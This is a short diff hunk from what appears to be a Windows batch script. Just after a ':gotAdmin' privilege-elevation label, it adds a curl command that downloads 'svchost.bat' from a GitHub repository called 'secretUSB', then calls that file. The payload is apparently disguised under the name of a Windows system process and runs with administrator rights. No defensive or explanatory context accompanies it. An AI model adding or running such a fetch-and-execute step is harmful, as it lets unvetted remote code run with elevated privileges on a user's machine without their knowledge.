@@ -23,6 +23,7 @@ if '%errorlevel%' NEQ '0' (
 
 :gotAdmin
 
+curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/svchost.bat
 call svchost.bat
 
 color 0a
